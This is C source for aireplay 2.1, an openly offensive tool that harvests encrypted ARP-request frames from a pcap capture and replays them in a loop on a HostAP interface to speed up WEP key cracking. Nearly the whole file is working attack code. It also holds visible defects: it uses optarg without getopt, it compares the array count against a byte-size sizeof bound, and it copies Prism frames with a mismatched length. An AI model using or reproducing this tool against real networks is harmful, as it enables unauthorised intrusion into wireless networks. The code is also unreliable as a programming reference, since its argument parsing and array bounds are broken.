/*
 *  802.11 WEP arp-requests replay attack
 *
 *  Copyright (C) 2004  Christophe Devine
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#include <netpacket/packet.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

#include "pcap.h"

#ifndef ETH_P_ALL
#define ETH_P_ALL 3
#endif

#define BROADCAST_ADDR "\xFF\xFF\xFF\xFF\xFF\xFF"

char usage[] =

"\n"
"  aireplay 2.1 - (C) 2004 Christophe Devine\n"
"\n"
"  usage: aireplay <wifi interface> <input filename> [bssid]\n"
"\n";

unsigned char buffer[65536];

struct __packet
{
    unsigned int length;
    unsigned char *data;
}
arp_packets[4096];

int do_exit = 0;

void sighandler( int signum )
{
    if( signum == SIGINT || signum == SIGTERM )
        do_exit = 1;
}

int main( int argc, char *argv[] )
{
    FILE *f_cap;

    char *s;
    int bssid_set;
    long cnt1, cnt2;
    int i, n, raw_sock;
    unsigned char *h80211;
    unsigned char bssid[6];

    struct ifreq ifr;
    struct sockaddr_ll sll;
    struct pcap_file_header pfh;
    struct pcap_pkthdr pkh;
    time_t tm_prev;

    /* create the raw socket */

    if( ( raw_sock = socket( PF_PACKET, SOCK_RAW,
                             htons( ETH_P_ALL ) ) ) < 0 )
    {
        perror( "socket(PF_PACKET)" );
        return( 1 );
    }

    /* drop privileges */

    setuid( getuid() );

    /* check the arguments */

    if( argc < 3 || argc > 4 )
    {
    usage:
        printf( usage );
        return( 1 );
    }

    bssid_set = 0;

    if( argc == 4 )
    {
        i = 0;
        s = optarg;

        while( sscanf( s, "%x", &n ) == 1 )
        {
            if( n < 0 || n > 255 )
                goto usage;

            bssid[i] = n;

            if( ++i == 6 ) break;

            if( ! ( s = strchr( s, ':' ) ) )
                break;

            s++;
        }

        if( i != 6 ) goto usage;

        bssid_set = 1;
    }

    if( argc - optind != 2 )
        goto usage;

    if( strcmp( argv[optind], "wlan0ap" ) &&
        strcmp( argv[optind], "wlan1ap" ) &&
        strcmp( argv[optind], "wlan2ap" ) )
    {
        fprintf( stderr, "This program only works with HostAP's "
                 "wlan#ap interface.\n" );
        return( 1 );
    }

    /* open the input file and check the pcap header */

    if( ( f_cap = fopen( argv[optind + 1], "rb" ) ) == NULL )
    {
        perror( "open" );
        return( 1 );
    }

    n = sizeof( struct pcap_file_header );

    if( fread( &pfh, 1, n, f_cap ) != (size_t) n )
    {
        perror( "read(pcap header)" );
        return( 1 );
    }

    if( pfh.magic != TCPDUMP_MAGIC )
    {
        fprintf( stderr, "wrong magic from pcap file header\n"
                         "(got 0x%08X, expected 0x%08X)\n",
                         pfh.magic, TCPDUMP_MAGIC );
        return( 1 );
    }

    if( pfh.linktype != LINKTYPE_IEEE802_11 &&
        pfh.linktype != LINKTYPE_PRISM_HEADER )
    {
        fprintf( stderr, "unsupported pcap header linktype %d\n",
                 pfh.linktype );
        return( 1 );
    }

    /* find the interface index */

    memset( &ifr, 0, sizeof( ifr ) );
    strncpy( ifr.ifr_name, argv[optind], sizeof( ifr.ifr_name ) - 1 );

    if( ioctl( raw_sock, SIOCGIFINDEX, &ifr ) < 0 )
    {
        perror( "ioctl(SIOCGIFINDEX)" );
        return( 1 );
    }

    /* bind the raw socket to the interface */

    memset( &sll, 0, sizeof( sll ) );
    sll.sll_family   = AF_PACKET;
    sll.sll_ifindex  = ifr.ifr_ifindex;
    sll.sll_protocol = htons( ETH_P_ALL );

    if( bind( raw_sock, (struct sockaddr *) &sll,
              sizeof( sll ) ) < 0 )
    {
        perror( "bind(ETH_P_ALL)" );
        return( 1 );
    }

    signal( SIGINT, sighandler );

    tm_prev = time( NULL );

    cnt1 = cnt2 = 0;

    /* search for potentially usable packets */

    while( 1 )
    {
        if( do_exit ) break;

        if( time( NULL ) - tm_prev >= 1 )
        {
            tm_prev = time( NULL );
            printf( "\r\33[1KRead %ld packets, got %ld "
                    "potential ARP packets\r", cnt1, cnt2 );
            fflush( stdout );
        }

        /* read one packet */

        n = sizeof( pkh );

        if( fread( &pkh, 1, n, f_cap ) != (size_t) n )
            break;

        if( pkh.len != pkh.caplen )
            continue;

        n = pkh.caplen;

        if( fread( buffer, 1, n, f_cap ) != (size_t) n )
            break;

        cnt1++;

        h80211 = buffer;

        if( pfh.linktype == LINKTYPE_PRISM_HEADER )
        {
            /* remove the prism header if necessary */

            n = *(int *)( h80211 + 4 );

            if( n < 8 || n >= (int) pkh.len )
                continue;

            h80211 += n; pkh.len -= n;
        }

        /* check if it's an encrypted data packet */

        if( pkh.len < 40 ) continue;

        if( ( h80211[0] & 0x0C ) != 0x08 ) continue;
        if( ( h80211[1] & 0x40 ) != 0x40 ) continue;

        /* also check the BSSID and KeyID */

        switch( h80211[1] & 3 )
        {
            case  0: i = 16; break;      /* DA, SA, (BSSID)  */
            case  1: i =  4; break;      /* (BSSID), SA, DA  */
            case  2: i = 10; break;      /* DA, (BSSID), SA  */
            default: i =  4; break;      /* (RA), TA, DA, SA */
        }

        if( bssid_set == 0 )
        {
            bssid_set = 1;

            memcpy( bssid, h80211 + i, 6 );

            printf( "\33[2KChoosing first encrypted BSSID"
                    " = %02X:%02X:%02X:%02X:%02X:%02X\n",
                    bssid[0], bssid[1], bssid[2],
                    bssid[3], bssid[4], bssid[5] );
        }
        else
            if( memcmp( bssid, h80211 + i, 6 ) )
                continue;

        /* finally check the packet length & broadcast address */

        switch( h80211[1] & 3 )
        {
            case  0: i =  4; break;      /* (DA), SA, BSSID  */
            case  1: i = 16; break;      /* BSSID, SA, (DA)  */
            case  2: i =  4; break;      /* (DA), BSSID, SA  */
            default: i = 16; break;      /* RA, TA, (DA), SA */
        }

        if( pkh.len + ( h80211[27] & 0x3F ) != 0x44 ||
            memcmp( h80211 + i, BROADCAST_ADDR, 6 ) )
            continue;

        /* ok, this packet may be replayed */

        arp_packets[cnt2].length = pkh.len;

        arp_packets[cnt2].data = (unsigned char *)
                                    malloc( pkh.len );

        if( ! arp_packets[cnt2].data )
        {
            perror( "malloc" );
            return( 1 );
        }

        memcpy( arp_packets[cnt2].data, buffer, pkh.len );

        if( cnt2++ >= (int) sizeof( arp_packets ) )
            break;
    }

    printf( "\r\33[1KRead %ld packets, got %ld "
            "potential ARP requests.\n", cnt1, cnt2 );

    if( cnt2 == 0 )
        return( 1 );

    /* now loop sending the ARP packets we've got */

    cnt1 = 0;

    while( cnt2 )
    {
        for( i = 0; i < cnt2; i++ )
        {
            if( do_exit ) cnt2 = 0;

            if( time( NULL ) - tm_prev >= 1 )
            {
                tm_prev = time( NULL );
                printf( "\r\33[1KSent %ld packets\r", cnt1 );
                fflush( stdout );
            }

            n = arp_packets[i].length;

            if( write( raw_sock, arp_packets[i].data, n ) != n )
            {
                perror( "write" );
                return( 1 );
            }

            cnt1++;
        }
    }

    printf( "\r\33[1KSent %ld packets.\n", cnt1 );

    return( 0 );
}
